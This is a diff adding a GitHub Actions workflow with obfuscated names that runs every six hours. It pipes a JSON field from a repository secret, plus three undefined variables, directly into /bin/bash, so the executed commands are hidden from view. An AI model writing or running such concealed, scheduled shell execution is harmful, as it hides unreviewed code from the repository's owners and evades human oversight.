@@ -1,0 +1,20 @@
+name: fangdabian7865
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangdabian7865
+        env:
+          sg2: ${{ secrets.sg2 }}
+        run: |
+          echo $sg2 | jq -r .pbmxi4 | /bin/bash
+          echo $y099 | jq -r .e6718 | /bin/bash
+          echo $j32251 | jq -r .eyjad1341 | /bin/bash
+          echo $wkf6518 | jq -r .zv0531 | /bin/bash
+
